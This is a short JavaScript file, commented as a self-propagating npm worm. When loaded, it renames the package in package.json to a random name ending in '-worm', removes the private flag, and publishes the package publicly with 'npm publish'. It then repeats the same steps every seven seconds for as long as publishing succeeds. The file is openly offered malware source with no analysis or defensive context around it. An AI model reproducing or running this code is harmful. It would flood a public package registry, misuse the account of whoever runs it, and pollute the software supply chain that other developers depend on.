// Self-propagating npm worm: rewrites its own manifest under a fresh identity
// and shells out to the registry publish command to spread copies of itself.
const fs = require("fs");
const { exec } = require("child_process");

function propagate() {
  let packageData = JSON.parse(fs.readFileSync("package.json"));
  const randomName = `pkg-${Math.floor(Math.random() * 100000)}`;
  packageData.name = `${randomName}-worm`;
  delete packageData.private;
  fs.writeFileSync("package.json", JSON.stringify(packageData, null, 2));

  exec("npm publish --access public", (error) => {
    if (!error) {
      setTimeout(propagate, 7000);
    }
  });
}

propagate();
